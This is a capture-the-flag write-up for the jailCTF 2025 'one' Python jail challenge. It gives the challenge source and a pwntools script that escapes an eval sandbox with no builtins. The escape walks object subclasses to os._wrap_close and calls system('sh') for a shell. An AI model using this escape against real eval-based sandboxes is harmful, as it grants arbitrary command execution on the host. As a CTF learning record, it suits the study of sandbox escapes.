# jailCTF 2025 one

```python
#!/usr/local/bin/python3
assert(c:=input("one please > ")).count(".")!=1,eval(c,{'__builtins__':{}})
```

Requirements:

1. Only one `.`: use lambda function to reuse `value.__getattribute__` call
2. No builtins: use `().__setattr__.__objclass__.__subclasses__()[os_index].__init__.__globals__['system']('sh')` to get shell

Inspired by @xtea418 on Discord:

```python
[g:=(lambda x,*y: x.__getattribute__(*y)), a:=g([], "__setattr__"),b:=g(a, "__objclass__"), c:=g(b, b, "__subclasses__")()[-1], d:=g(c, c, "__init__"),e:=g(d, "__builtins__"),f:=e["__import__"]("os"),g(f,"system")("sh")]
```

Attack script:

```python
from pwn import *

context(log_level="debug")

subclasses = str(().__class__.__base__.__subclasses__())

# find the indices of the builtins
# assuming we are using the same Python version as remote

# assuming os is at 158
os_index = 158
assert subclasses.split(", ").index("<class 'os._wrap_close'>") == os_index


p = process(["python3", "main.py"])
p.recvuntil(b"> ")
p.sendline(
    (
        "[G:=(lambda x,*y: x.__getattribute__(*y)),"
        # ().__setattr__
        + "A:=G((),'__setattr__'),"
        # ().__setattr__.__objclass__ is object
        + "B:=G(A,'__objclass__'),"
        # ().__setattr__.__objclass__.__subclasses__()[os_index]
        + f"C:=G(B,B,'__subclasses__')()[{os_index}],"
        # ().__setattr__.__objclass__.__subclasses__()[os_index].__init__
        + "D:=G(C,C,'__init__'),"
        # ().__setattr__.__objclass__.__subclasses__()[os_index].__init__.__globals__['system']('sh')
        + "G(D,'__globals__')['system']('sh')]"
    ).encode()
)
p.interactive()
```
